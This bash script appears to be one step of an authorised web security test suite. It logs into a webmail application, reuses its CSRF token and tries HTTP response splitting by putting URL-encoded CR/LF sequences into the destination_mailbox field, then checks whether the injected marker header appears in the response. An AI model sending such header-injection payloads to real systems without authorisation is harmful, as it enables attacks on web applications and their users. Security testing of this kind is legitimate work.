#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)/lib/common.sh"
load_env
require_cmds curl awk grep sed
setup_run_dir "35-http-response-splitting"

perform_login cookies.txt login.headers login.body.html
fetch_get "${MESSAGE_VIEW_PATH}?mailbox=${DEFAULT_MAILBOX}&uid=${DEFAULT_MESSAGE_UID}" message.html message.headers cookies.txt
csrf="$(extract_first_csrf message.html)"
mailbox="$(extract_hidden_value message.html mailbox)"
uid="$(extract_hidden_value message.html uid)"

while IFS='|' read -r label dest; do
  curl -sS -o "${label}.html" -D "${label}.headers" -b cookies.txt -c cookies.txt \
    -X POST "${TARGET_BASE_URL}${MESSAGE_MOVE_PATH}" \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H "Origin: ${TARGET_BASE_URL}" \
    -H "Referer: ${TARGET_BASE_URL}${MESSAGE_VIEW_PATH}?mailbox=${DEFAULT_MAILBOX}&uid=${DEFAULT_MESSAGE_UID}" \
    --data-urlencode "csrf_token=${csrf}" \
    --data-urlencode "mailbox=${mailbox}" \
    --data-urlencode "uid=${uid}" \
    --data-urlencode "destination_mailbox=${dest}"
  printf '\n===== %s =====\ndestination_mailbox=%s\nhttp=%s\nlocation=%s\nx_wstg_split_header=%s\ntitle=%s\n' \
    "$label" "$dest" "$(header_code "${label}.headers")" "$(header_field "${label}.headers" location)" "$(header_field "${label}.headers" X-WSTG-Split)" "$(html_title "${label}.html")"
  sed -n '1,40p' "${label}.headers"
done <<'EOF'
control_invalid|NOBOXWSTG
crlf_inject|NOBOXWSTG%0D%0AX-WSTG-Split:%20yes
lf_inject|NOBOXWSTG%0AX-WSTG-Split:%20yes
EOF

printf '\nSaved in %s\n' "$RUN_DIR"
